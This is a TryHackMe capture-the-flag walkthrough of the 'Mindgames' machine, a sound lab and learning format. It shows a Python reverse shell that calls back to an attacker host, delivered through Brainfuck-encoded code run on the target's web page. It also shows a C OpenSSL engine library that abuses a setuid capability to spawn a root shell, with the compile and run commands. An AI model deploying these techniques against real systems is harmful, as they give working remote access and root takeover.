---
title: Mindgames
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Mindgames
  machine on TryHackMe.
slug: mindgames
---




```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   478.29 ms 192.168.128.1
2   ...
3   478.29 ms mind.thm (10.64.144.177)

```

> This is what the website has to say

```
Hello, World

+[------->++<]>++.++.---------.+++++.++++++.+[--->+<]>+.------.++[->++<]>.-[->+++++<]>++.+++++++..+++.[->+++++<]>+.------------.---[->+++<]>.-[--->+<]>---.+++.------.--------.-[--->+<]>+.+++++++.>++++++++++.

Fibonacci

--[----->+<]>--.+.+.[--->+<]>--.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.++[++>---<]>+.-[-->+++<]>--.>++++++++++.[->+++<]>++....-[--->++<]>-.---.[--->+<]>--.+[----->+<]>+.-[->+++++<]>-.--[->++<]>.+.+[-->+<]>+.[-->+++<]>+.+++++++++.>++++++++++.[->+++<]>++........---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.[-->+++<]>+.>++++++++++.[->+++<]>++....---[----->++<]>.-------------.[--->+<]>---.+.---.----.-[->+++++<]>-.+++[->++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.++++.--------.++.-[--->+++++<]>.[-->+<]>+++++.[--->++<]>--.[----->++<]>+.+++++.---------.>++++++++++...[--->+++++<]>.+++++++++.+++.[-->+++++<]>+++.-[--->++<]>-.[--->+<]>---.-[--->++<]>-.+++++.-[->+++++<]>-.---[----->++<]>.+++[->+++<]>++.+++++++++++++.-------.--.--[->+++<]>-.+++++++++.-.-------.-[-->+++<]>--.>++++++++++.[->+++<]>++....[-->+++++++<]>.++.---------.+++++.++++++.+[--->+<]>+.-----[->++<]>.[-->+<]>+++++.-----[->+++<]>.[----->++<]>-..>++++++++++.
```

> Use `Brainfuck` to decode `https://www.dcode.fr/brainfuck-language`

> So I get reverse shell and decode it using brainfuck and run in brower and get reverse shell

```
import pty
import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.153.193", 5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")

```

> after decode

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.++++.+++.-.+++.++.<<++.>>----.++++.+++++.<<<.>>>----------------.++++.+++.-.+++.++.<<.>>-.----.------------.++++++++.------.+++++++++++++++.<<++++++++++++.>>-----.++++.<<<.>>>.<---------.>.----.------------.++++++++.------.+++++++++++++++.<<++.>>-.----.------------.++++++++.------.+++++++++++++++.<<------.>>-.----.------------.++++++++.------.+++++++++++++++.<<++++++.>++++.+++++.>---------------------.<+++.+++++.---------.>-----------.<<--.>>+++++++++++++++++++++++++++++++.----.------------.++++++++.------.+++++++++++++++.<<++.>++++++++++++++.----.------------.++++++++.++++++++++++++++++++.------------.+.--.-------------.----.++++++++++++.<-----.<.>>>-.<<+++++.>>----------------.++++++++++++.-..---------.--.+++++++++++++++++.<<------..------.+++++++++++++++.++++++++.-------.----.+++.+++++.++.----------.+++.++++.--.-----.+++.++++++++.------.-----------------.++++++++++.------------.+++++++++++++++++++++....------------..<.>>>-----.++++.<<+++++.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.++++.-------.<.>>>.++++.<<+++++.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.+++++.--------.<.>>>.++++.<<+++++.>>---------------.+++++++++++++++++.-----.<<++++.----------.>>+++.<<++++++.>>-------------.+++.+++.-------.+++++++++.+.<<------.+.+++.++++++.---------.<.>>>+.++++.+++++.<<+++++.>>------.---.---------------.++++++++++++++++++++++.---------.<<------.------.+++++++++++++.>>------------.+++++++.+++++.<<.>>------------.-.++++++++++++++++++.-----------.<<-------------.+++++++.
```

> and run in browser and done

```
mindgames@mindgames:~$ cat user.txt

```

> after running lenpease found something

```
[+] Files with POSIX capabilities set:
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/openssl = cap_setuid+ep
/home/mindgames/webserver/server = cap_net_bind_service+ep

```

> The “openssl” has the setuid cap. Which means, I can use openssl to setuid to 0 (root’s uid) and become root. Look at openssl | GTFOBins:

> OpenSSL can execute code via a library. So, I can code a simple C program to setuid(0), compile it to a library and use Openssl to exec it.

```
#include <openssl/engine.h>
#include <unistd.h>

static int bind(ENGINE *e, const char *id)
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()


save as a shellroot.c
```

> compile it

```
gcc -fPIC -o shellroot.o -c shellroot.c
gcc -shared -o shellroot.so -lcrypto shellroot.o

```

> and get it into victim machine

```
                    chmod +x shellroot.so
mindgames@mindgames:~/webserver$ openssl req -engine ./shellroot.so
root@mindgames:~/webserver# cd /root
root@mindgames:/root# ls
root.txt
root@mindgames:/root# cat root.txt
```